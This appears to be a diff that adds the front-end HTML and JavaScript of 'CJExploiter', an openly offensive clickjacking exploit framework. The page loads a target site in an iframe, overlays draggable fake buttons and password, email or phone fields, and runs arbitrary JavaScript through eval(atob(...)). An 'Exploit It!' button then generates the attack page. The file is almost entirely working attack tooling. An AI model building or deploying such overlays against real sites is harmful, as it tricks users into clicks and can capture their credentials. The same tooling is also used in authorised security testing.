@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>ClickJacking Exploit Framework</title>
+
+    <link href="resources/css/bootstrap.css" rel="stylesheet" media="screen">
+    <link rel="stylesheet" href="resources/css/jquery-ui.theme.css">
+    <link rel="stylesheet" href="resources/css/style.css">
+    <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
+    <script type="text/javascript" src="resources/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
+    <script type="text/javascript" src="resources/js/jquery-ui.js"></script>
+
+</head>
+
+<body>
+<div id="Main"></div>
+<div id="draggable" class="ui-widget-header">
+    <h2 class="text-center">
+        CJExploiter Framework
+    </h2>
+
+    <form class="form-horizontal">
+        <fieldset>
+            <div class="form-group">
+                <div class="col-lg-12">
+                    <input type="text" class="form-control" id="inputReadTarget" placeholder="http://site.com">
+                </div>
+
+            
+            </div>
+
+
+
+            <div class="form-group">
+                <div class="col-lg-6" style="padding-right:0 !important">
+                    <input type="text" class="form-control" id="inputReadName" placeholder="Name">
+				</div>
+                <div class="col-lg-6" style="padding-left:0 !important">
+                    <select id="inputReadType" class="form-control" >
+                            <option value="button">Button</option>
+                            <option value="email">Email</option>
+                            <option value="text">Text</option>
+                            <option value="tel">Tel</option>
+                            <option value="password">Password</option>
+                          </select>
+                </div>
+                <div class="col-lg-12" >
+
+                            <textarea rows="3" class="form-control" id="inputReadJS" placeholder="Your Custom JavaScript"></textarea>
+
+                </div>
+                <div class="col-lg-12" >
+
+                    <a class="btn btn-success pull-right" onclick="addInput()">Add Input</a>
+                </div>                
+            </div>
+
+        </fieldset>
+    </form>
+    <div class="box-footer clearfix" style="display: block;">
+    <div class="row">
+        <div class="col-lg-12">
+        	<a class="btn btn-success pull-right" id="viewSite">View Site</a>
+            <a class="btn btn-primary pull-right" id="Exploit">Exploit It!</a>
+        </div>
+
+        <div class="col-lg-12">
+        <span>http://github.com/enddo</span>
+        </div>
+    </div>
+    </div>
+</div>
+
+
+<iframe id="targetIframe" scrolling="no" frameBorder="0"
+        style="position: relative;overflow: hidden;margin: 0; padding: 0;display: block"
+        src="" width="100%"
+        height="1000">
+</iframe>
+
+    <script>
+		var items = [];
+        $(document).ready(function () {
+
+			$("#draggable").draggable()
+            $('#viewSite').click(function () {
+                var newTarget = $('#inputReadTarget').val();
+                $("#targetIframe").attr('src', newTarget);
+            });
+
+
+            $('#Exploit').click(function () {
+				var uri = '';
+				for(i=0;i <items.length;i++) {
+					var selected = $("#inputDrag"+items[i][0]+items[i][1]).offset();
+					var input = $("#inputDrag"+items[i][0]+items[i][1]).width();
+					uri += items[i][0] + ',' + items[i][1] + ',' + items[i][2] + ',' + selected.left + ',' + selected.top + ',' + input + '|';				
+				}
+				uri = uri.substring(0, uri.length - 1)
+                uri = "sandbox.html?target=" + encodeURIComponent($('#inputReadTarget').val()) + '&inputs=' + encodeURIComponent(uri);
+
+                window.open(uri, '_blank');
+
+            });
+
+        });
+		
+		function addInput() {
+			var name = $("#inputReadName").val();
+			var type = $("#inputReadType").val();
+			var html = '';
+			var script = 'eval(atob(\''+btoa($("#inputReadJS").val())+'\'))';
+			if(name.length > 0) {
+				items.push([name,type,btoa($("#inputReadJS").val())])
+				if(type == 'button')
+					html = '<div class="drag-widget-header" draggable="true" id="inputDivDrag'+name+type+'"><p class="text-center">DRAG ME <input type="text" placeholder="width" style="width:50px" onChange="changeWidth(event,\'inputDrag'+name+type+'\')"><input type="button" class="pull-right" onclick="removeInput(\'inputDivDrag'+name+type+'\',\''+name+'\')" value="X"></p><input id="inputDrag'+name+type+'" type="submit" value="'+name+'" onclick="'+script+'"></div>';
+				else
+					html = '<div class="drag-widget-header" draggable="true" id="inputDivDrag'+name+type+'"><p class="text-center">DRAG ME <input type="text" placeholder="width" style="width:50px" onChange="changeWidth(event,\'inputDrag'+name+type+'\')"><input type="button" class="pull-right" onclick="removeInput(\'inputDivDrag'+name+type+'\',\''+name+'\')" value="X"></p><input id="inputDrag'+name+type+'" type="'+type+'" placeholder="'+name+'" onclick="'+script+'"></div>';
+				$("#Main").append(html);
+				$("#inputDivDrag"+name+type).draggable();
+			}
+			
+		}
+		function removeInput(id,name) {
+			var index = -1;
+			for(i=0;i <items.length;i++) {
+				if(items[i][0] == name) {
+					index = i;
+					break;
+				}
+			}
+			if(index != -1) {
+				items.splice(index, 1);
+				$('#'+id).remove();
+			}
+		}
+		function changeWidth(event,id) {
+			var size =$(event.target).val();
+			$('#'+id).width(parseInt(size));
+		}
+    </script>
+</body>
+
+</html>
